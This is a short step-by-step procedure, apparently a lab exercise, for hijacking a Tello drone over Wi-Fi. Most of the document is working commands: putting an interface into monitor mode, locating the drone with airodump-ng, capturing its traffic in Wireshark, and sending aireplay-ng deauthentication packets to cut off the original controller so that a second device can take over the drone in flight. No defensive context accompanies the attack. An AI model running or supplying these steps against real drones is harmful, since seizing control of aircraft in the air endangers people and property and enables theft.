# Steps for drone disruption

1. Open Ubuntu machine
2. Type the following commands:
   - `sudo ifconfig <interface> down`
   - `sudo iwconfig <interface> mode monitor`
   - `sudo ifconfig <interface> up`
3. Connect device A (mobile Tello app) to get MAC addresses (No need to fly the drone)
4. From Ubuntu machine, type:
   - `Sudo airodump-ng <interface>` to find the BSSID (MAC address) of the drone (34:D2:62:…..)
   - `Sudo airodump-ng –c <channel_#> <interface>` to get airodump-ng to be locked in the same channel
5. Run Wireshark to capture traffic for the interface **<interface>**
6. Connect device A (mobile Tello app) and fly the drone (move forward, rotate, etc. to capture these movements on Wireshark)
7. Run this command from your Ubuntu machine (while Wireshark is running)
   - `aireplay-ng --deauth <#_of_deauth_packets> -a <bssid_of_AP> -c <MAC_address_of_client> <interface>`
8. Connect device B (another mobile Tello app) and fly the drone
9. See if you can gain control from Device A again (while running Wireshark)
